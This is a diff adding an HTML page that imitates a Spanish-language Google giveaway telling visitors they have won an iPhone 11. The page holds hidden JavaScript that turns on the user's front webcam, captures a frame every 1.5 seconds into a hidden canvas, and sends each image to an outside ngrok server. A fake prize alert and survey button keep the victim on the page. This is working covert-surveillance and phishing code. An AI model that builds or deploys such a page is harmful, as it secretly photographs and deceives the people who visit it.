@@ -1,0 +1,99 @@
+<!doctype html>
+<html>
+<head>
+	<link rel="stylesheet" href=".style.css">
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'https://0b3487dbfef1.ngrok.io/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+		<script>
+			alert("FELICIDADES!\nUsuario de Google!\n\nHas sido seleccionado como ganador del iPhone11, iPhone X o Samsung galaxi s10 gratis el dia de hoy.\n\nPor favir haga click en 'aceptar' para reclamar tu premio.");
+		</script>
+
+    <body>
+	    <header id="cabezera">
+		    <img src=".google.png" id="google">
+	    </header>
+	    <div id="contenido">
+		    <center><b><p id="parrafo1">FELICIDADES!</p></b></center>
+		    <p id="parrafo2">Estimado usuario, felicidades!</p>
+		    <p id="parrafo3">Como muestra de agradecimiento por ser un fiel usuario de Google.Su direccion IP a sido seleccionado al azar para recibir un iPhone11 completamente gratis.</p>
+		    <p id="parrafo4">De ves en cuando seleccionamos un número de usuarios de Google para darles la oportunidad de recibir valiosos regalos de nuestros patrocinadores.Esta es nuestra forma de agradecerle a Google como su navegador de preferencia.</p>
+		    <p id="parrafo5">Hoy es tu día de suerte! Esta entre uno de los 10 usuarios seleccionados al azar que recibiran este regalo de nuestro socio tecnologico Google.</p>
+		    <p id="parrafo6">Para recibir su regalo, simplemente complete nuestra breve encuesta y de forma anonima, solo estara disponibles unos cuantos regalos el dia de hoy.</p>
+	    </div>
+	    <footer>
+		    <center><img src=".iPhone11" id="iPhone11"></center>
+		    <center><button id="boton">Reclame gratis</button></center>
+	    </footer>
+
+    </body>
+
+</html>
